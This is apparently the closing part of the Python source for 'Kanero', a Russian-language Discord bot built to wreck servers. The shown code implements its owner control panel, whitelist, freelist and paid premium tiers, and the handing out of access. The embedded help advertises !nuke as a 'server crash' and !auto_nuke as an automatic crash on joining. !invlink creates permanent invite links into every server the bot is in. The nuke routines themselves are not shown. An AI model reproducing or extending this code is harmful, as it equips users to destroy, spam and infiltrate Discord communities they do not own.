            ctx = await bot.get_context(message)
            await changelog(ctx)
            return

        # Всё остальное — только для вайтлиста
        if not is_whitelisted(message.author.id):
            return

        # !owner_help — список всех ЛС-команд (только OWNER_ID)
        if content == "!owner_help":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Нет доступа.")
                return
            embed = discord.Embed(
                title="💀 OWNER PANEL — Kanero",
                description=(
                    "```\n"
                    " ░█████╗░░██╗░░░░░░░██╗███╗░░██╗███████╗██████╗░\n"
                    " ██╔══██╗░██║░░██╗░░██║████╗░██║██╔════╝██╔══██╗\n"
                    " ██║░░██║░╚██╗████╗██╔╝██╔██╗██║█████╗░░██████╔╝\n"
                    " ██║░░██║░░████╔═████║░██║╚████║██╔══╝░░██╔══██╗\n"
                    " ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║███████╗██║░░██║\n"
                    " ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝\n"
                    "```\n"
                    "> 🔐 Только ты имеешь доступ к этому меню."
                ),
                color=0x0a0a0a
            )
            embed.add_field(
                name="🖥️ СЕРВЕРЫ",
                value=(
                    "`!guilds` — список серверов бота (кнопки выбора)\n"
                    "`!setguild <id>` — выбрать сервер по ID\n"
                    "`!invlink` — инвайт-ссылки со всех серверов"
                ),
                inline=False
            )
            embed.add_field(
                name="⚡ КОМАНДЫ НА СЕРВЕРЕ",
                value=(
                    "Выбери сервер → пиши команды прямо в ЛС:\n"
                    "`!nuke` · `!stop` · `!cleanup`\n"
                    "`!rename` · `!nsfw_all` · `!unnsfw_all`\n"
                    "`!nicks_all` · `!webhooks`\n"
                    "`!auto_nuke on/off/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="💎 PREMIUM",
                value=(
                    "Даёт возможность использовать `!nuke [свой текст]`.\n\n"
                    "`!pm_add <id>` — выдать Premium\n"
                    "`!pm_remove <id>` — забрать Premium\n"
                    "`!pm_list` — список Premium пользователей"
                ),
                inline=False
            )
            embed.add_field(
                name="📝 ТЕКСТ НЮКА",
                value=(
                    "Дефолтный текст который используется при `!nuke` без аргументов.\n\n"
                    "`!set_spam_text <текст>` — сменить текст\n"
                    "`!get_spam_text` — показать текущий текст"
                ),
                inline=False
            )
            embed.add_field(
                name="🔒 БЛОКИРОВКА СЕРВЕРОВ",
                value=(
                    "Запрещает боту работать на сервере — никто из вайтлиста не сможет им воспользоваться там.\n\n"
                    "`!block_guild <id>` — заблокировать\n"
                    "`!unblock_guild <id>` — разблокировать\n"
                    "`!blocked_guilds` — список заблокированных"
                ),
                inline=False
            )
            embed.add_field(
                name="👑 OWNER WHITELIST",
                value=(
                    "`!owl_add <id>` — добавить\n"
                    "`!owl_remove <id>` — убрать\n"
                    "`!owl_list` — список"
                ),
                inline=False
            )
            embed.add_field(
                name="👁️ ДОСТУП (ПОДПИСЧИКИ)",
                value=(
                    "`!wl_add <id>` — выдать доступ\n"
                    "`!wl_remove <id>` — забрать доступ\n"
                    "`!wl_list` — список допущенных"
                ),
                inline=False
            )
            embed.set_footer(text="☠️ Kanero  |  v2.0  |  Команды работают только в ЛС")
            embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
            await message.channel.send(embed=embed)
            return

        # !owl_add <id> — добавить в owner whitelist (только OWNER_ID)
        if content.startswith("!owl_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid not in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.append(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в owner whitelist.")
                else:
                    await message.channel.send("Уже в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_add <id>`")
            return

        # !owl_remove <id> — убрать из owner whitelist (только OWNER_ID)
        if content.startswith("!owl_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.remove(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из owner whitelist.")
                else:
                    await message.channel.send("Не найден в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_remove <id>`")
            return

        # !owl_list — показать owner whitelist (только OWNER_ID)
        if content == "!owl_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может смотреть owner whitelist.")
                return
            if not config.OWNER_WHITELIST:
                await message.channel.send("Owner whitelist пуст.")
            else:
                lines = []
                for uid in config.OWNER_WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="👑 Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.OWNER_WHITELIST)}")
                await message.channel.send(embed=embed)
            return

        # !guilds — показать список серверов с кнопками выбора
        if content == "!guilds":
            guilds = list(bot.guilds)
            if not guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
            view = GuildSelectView(guilds, message.author.id)
            current = active_guild.get(message.author.id)
            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "не выбран"
            await message.channel.send(
                f"Серверы бота (активный: **{current_name}**):\n{lines}\n\nВыбери сервер кнопкой:",
                view=view
            )
            return

        # !invlink — прислать инвайт-ссылки со всех серверов
        if content == "!invlink":
            if not bot.guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = []
            for g in bot.guilds:
                try:
                    ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
                        lines.append(f"**{g.name}** — {inv.url}")
                    else:
                        lines.append(f"**{g.name}** — нет прав на создание инвайта")
                except Exception as e:
                    lines.append(f"**{g.name}** — ошибка: {e}")
            await message.channel.send("\n".join(lines))
            return

        # !setguild <id> — выбрать сервер вручную по ID
        if content.startswith("!setguild "):
            try:
                gid = int(content.split()[1])
                guild = bot.get_guild(gid)
                if not guild:
                    await message.channel.send("Сервер не найден.")
                    return
                active_guild[message.author.id] = gid
                await message.channel.send(f"✅ Активный сервер: **{guild.name}**")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!setguild <id>`")
            return

        # !block_guild [id] — заблокировать сервер (только OWNER_ID)
        if content.startswith("!block_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
            else:
                await message.channel.send("Сервер уже заблокирован.")
            return

        # !unblock_guild [id] — разблокировать сервер (только OWNER_ID)
        if content.startswith("!unblock_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")
            return

        # !blocked_guilds — список заблокированных серверов (только OWNER_ID)
        if content == "!blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))
            return

        # !pm_add <id> — выдать premium (только OWNER_ID)
        if content.startswith("!pm_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!pm_add <id>`")
                return
            if not uid:
                await message.channel.send("Укажи ID: `!pm_add <id>`")
                return
            if uid not in PREMIUM_LIST:
                PREMIUM_LIST.append(uid)
                save_premium()
                await message.channel.send(f"💎 `{uid}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
            else:
                await message.channel.send("Уже в Premium.")
            return

        # !pm_remove <id> — забрать premium (только OWNER_ID)
        if content.startswith("!pm_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!pm_remove <id>`")
                return
            if not uid:
                await message.channel.send("Укажи ID: `!pm_remove <id>`")
                return
            if uid in PREMIUM_LIST:
                PREMIUM_LIST.remove(uid)
                save_premium()
                await message.channel.send(f"✅ `{uid}` убран из Premium.")
            else:
                await message.channel.send("Не найден в Premium.")
            return

        # !pm_list — список premium (только OWNER_ID)
        if content == "!pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium список пуст.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)
            return

        # Любая другая команда — выполняем на активном сервере
        DM_ONLY_COMMANDS = (
            "!help", "!changelog", "!owner_help", "!guilds", "!invlink",
            "!owl_add", "!owl_remove", "!owl_list",
            "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
            "!pm_add", "!pm_remove", "!pm_list",
        )
        if any(content == cmd or content.startswith(cmd + " ") for cmd in DM_ONLY_COMMANDS):
            return

        if content.startswith("!") and content != "!":
            # Только овнер может выполнять команды через ЛС
            if message.author.id != config.OWNER_ID:
                await message.channel.send(embed=discord.Embed(
                    description="❌ Команды в ЛС доступны только овнеру.",
                    color=0x0a0a0a
                ))
                return
            # Сначала пробуем активный сервер, иначе — домашний
            gid = active_guild.get(message.author.id) or HOME_GUILD_ID
            guild = bot.get_guild(gid)
            if not guild:
                await message.channel.send("❌ Домашний сервер недоступен.")
                return
            await run_dm_command(message, guild, content)
            return

    # ── Обычная обработка на сервере ────────────────────────
    if message.guild and is_guild_blocked(message.guild.id):
        return  # Сервер заблокирован — игнорируем всё

    # ── Блокировка команд на домашнем сервере для не-овнеров ──
    if (message.guild and message.guild.id == HOME_GUILD_ID
            and message.content.startswith("!")
            and not message.author.bot
            and message.author.id != config.OWNER_ID
            and message.author.id not in config.OWNER_WHITELIST):
        try:
            await message.delete()
        except Exception:
            pass
        try:
            await message.author.send(
                embed=discord.Embed(
                    description="☠️ Команды на нашем сервере не работают.\nДобавь бота на свой сервер и используй там.",
                    color=0x0a0a0a
                ).set_footer(text="☠️ Kanero")
            )
        except Exception:
            pass
        return

    # ── Канал addbot на домашнем сервере — выдаём freelist ──────────────────────
    if (message.guild and message.guild.id == HOME_GUILD_ID
            and ("addbot" in message.channel.name.lower())
            and not message.author.bot):
        try:
            await message.delete()
        except Exception:
            pass
        if message.author.id == config.OWNER_ID:
            return
        uid = message.author.id
        if uid in FREELIST:
            try:
                await message.author.send(
                    embed=discord.Embed(
                        title="✅ У тебя уже есть базовый доступ",
                        description=(
                            "Ты уже в freelist — можешь использовать `!nuke` и `!auto_nuke`.\n\n"
                            "Для расширенного доступа напиши: **davaidkatt**"
                        ),
                        color=0x0a0a0a
                    ).set_footer(text="Kanero  |  davaidkatt")
                )
            except Exception:
                pass
        else:
            FREELIST.append(uid)
            save_freelist()
            # Выдаём роль 👥 User на домашнем сервере
            try:
                home_guild = bot.get_guild(HOME_GUILD_ID)
                if home_guild:
                    member = home_guild.get_member(uid)
                    if not member:
                        member = await home_guild.fetch_member(uid)
                    if member:
                        user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                        if user_role:
                            await member.add_roles(user_role, reason="Freelist — написал в addbot")
            except Exception:
                pass
            try:
                await message.author.send(
                    embed=discord.Embed(
                        title="✅ Базовый доступ получен!",
                        description=(
                            "Ты добавлен в freelist и получил роль **👥 User**.\n\n"
                            "**Доступные команды:**\n"
                            "`!nuke` — краш сервера\n"
                            "`!auto_nuke on/off` — авто-краш при входе бота\n"
                            "`!help` — список команд\n"
                            "`!changelog` / `!changelogall` — история обновлений\n\n"
                            "Для White/Premium напиши: **davaidkatt** | **@Firisotik**\n\n"
                            "Наш сервер: https://discord.gg/aud6wwYVRd"
                        ),
                        color=0x0a0a0a
                    ).set_footer(text="Kanero  |  davaidkatt")
                )
            except Exception:
                pass
        return
    if message.content.strip() == "!" and is_whitelisted(message.author.id):
        ctx = await bot.get_context(message)
        await help_cmd(ctx)
        return
    await bot.process_commands(message)
    # Логируем только если это команда (начинается с !)
    if message.content.startswith("!"):
        log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)


@bot.event
async def on_ready():
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
    global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST, FREELIST

    # ── Загрузка из MongoDB ──
    wl = await db_get("data", "whitelist")
    if wl is not None:
        config.WHITELIST = wl
    owl = await db_get("data", "owner_whitelist")
    if owl is not None:
        config.OWNER_WHITELIST = owl
    bl = await db_get("data", "blocked_guilds")
    if bl is not None:
        BLOCKED_GUILDS = bl
    pm = await db_get("data", "premium")
    if pm is not None:
        PREMIUM_LIST = pm
    st = await db_get("data", "spam_text")
    if st is not None:
        config.SPAM_TEXT = st
    asn = await db_get("data", "auto_super_nuke")
    if asn is not None:
        AUTO_SUPER_NUKE = asn.get("enabled", False)
        AUTO_SUPER_NUKE_TEXT = asn.get("text", None)
        if "config" in asn:
            SNUKE_CONFIG.update(asn["config"])
    aspn = await db_get("data", "auto_superpr_nuke")
    if aspn is not None:
        AUTO_SUPERPR_NUKE = aspn.get("enabled", False)
        AUTO_SUPERPR_NUKE_TEXT = aspn.get("text", None)

    aon = await db_get("data", "auto_owner_nuke")
    if aon is not None:
        AUTO_OWNER_NUKE = aon.get("enabled", False)
        AUTO_OWNER_NUKE_TEXT = aon.get("text", None)

    onl = await db_get("data", "owner_nuke_list")
    if onl is not None:
        OWNER_NUKE_LIST = onl

    fl = await db_get("data", "freelist")
    if fl is not None:
        FREELIST = fl
    
    # Загрузка временных подписок
    await load_temp_subscriptions()

    # ── Регистрируем persistent views (кнопки выживают после перезапуска) ──
    bot.add_view(TicketCloseView())
    bot.add_view(TicketOpenView())
    # CompensationView — один экземпляр, custom_id="claim_comp_v2" покрывает все типы
    bot.add_view(CompensationView("pm", 24, datetime.utcnow() + timedelta(days=365)))

    bot.tree.clear_commands(guild=None)

    print(f"Бот запущен как {bot.user}")

    print(f"Бот запущен как {bot.user}")


@bot.event
async def on_command_error(ctx, error):
    """Глобальный обработчик ошибок — объясняет что пошло не так."""
    # Игнорируем если команда не найдена (не наша команда)
    if isinstance(error, commands.CommandNotFound):
        return

    # Не хватает аргументов
    if isinstance(error, commands.MissingRequiredArgument):
        cmd = ctx.command
        usage = f"`!{cmd.name}`"
        if cmd.name == "compensate":
            usage = "`!compensate @user wl/pm/fl 2d`\nПример: `!compensate @user pm 2d`"
        elif cmd.name == "announce_bug":
            usage = "`!announce_bug Название | Описание`"
        elif cmd.name == "wl_add":
            usage = "`!wl_add @user`"
        elif cmd.name == "pm_add":
            usage = "`!pm_add @user`"
        elif cmd.name == "fl_add":
            usage = "`!fl_add @user`"
        elif cmd.name == "giverole":
            usage = "`!giverole @user @роль`"
        elif cmd.name == "unban":
            usage = "`!unban <ID>`"
        else:
            usage = f"`!{cmd.name}` — не хватает аргумента `{error.param.name}`"
        await ctx.send(f"❌ **Не хватает аргументов.**\nПравильно: {usage}")
        return

    # Неверный тип аргумента
    if isinstance(error, commands.BadArgument):
        cmd = ctx.command
        if cmd.name == "compensate":
            await ctx.send(
                "❌ **Неверный аргумент.**\n"
                "Правильно: `!compensate @user wl/pm/fl 2d`\n"
                "**Типы:** `wl` · `pm` · `fl`\n"
                "**Время:** `2d` · `48h` · `24`"
            )
        else:
            await ctx.send(f"❌ **Неверный аргумент.** Проверь правильность команды: `!{cmd.name}`")
        return

    # Нет прав
    if isinstance(error, commands.CheckFailure):
        return  # Молча игнорируем — не наш пользователь

    # Остальные ошибки — логируем но не спамим
    if isinstance(error, commands.CommandInvokeError):
        original = error.original
        cmd_name = ctx.command.name if ctx.command else "?"
        await ctx.send(f"❌ Ошибка при выполнении `!{cmd_name}`: `{type(original).__name__}: {original}`")
        return


bot.run(config.TOKEN)


